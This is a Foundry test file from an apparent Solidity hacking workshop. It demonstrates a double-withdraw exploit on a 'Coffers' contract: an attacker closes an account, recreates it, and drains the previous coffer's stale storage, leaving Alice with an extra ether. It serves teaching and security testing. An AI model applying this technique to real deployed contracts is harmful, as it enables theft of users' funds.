//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "hack-workshop/SolidityHackingWorkshopV8.sol";

contract CoffersTest is Test {
    struct Coffer {
        uint256 nbSlots;
        mapping(uint256 => uint256) slots;
    }

    Coffers bank;
    address alice;
    address bob;

    function setUp() public {
        alice = address(7777);
        payable(alice).transfer(10 ether);

        bob = address(8888);
        payable(bob).transfer(10 ether);

        bank = new Coffers();
    }

    function testDoubleWithdraw() public {
        // set initial ethers to the bank
        vm.startPrank(bob);
        bank.createCoffer(1);
        bank.deposit{value: 2 ether}(bob, 0);
        vm.stopPrank();

        // alice-hacker is coming, and deposit 1 ether
        vm.startPrank(alice);
        bank.createCoffer(1);
        bank.deposit{value: 1 ether}(alice, 0);
        assertEq(alice.balance, 9 ether);

        // closing account just set nslot to 0
        bank.closeAccount();
        assertEq(alice.balance, 10 ether);
        // creating a new one, only activate the previous coffer (filled)
        bank.createCoffer(1);
        bank.closeAccount();
        // alice ends up with 1 additional ether
        assertEq(alice.balance, 11 ether);
    }
}
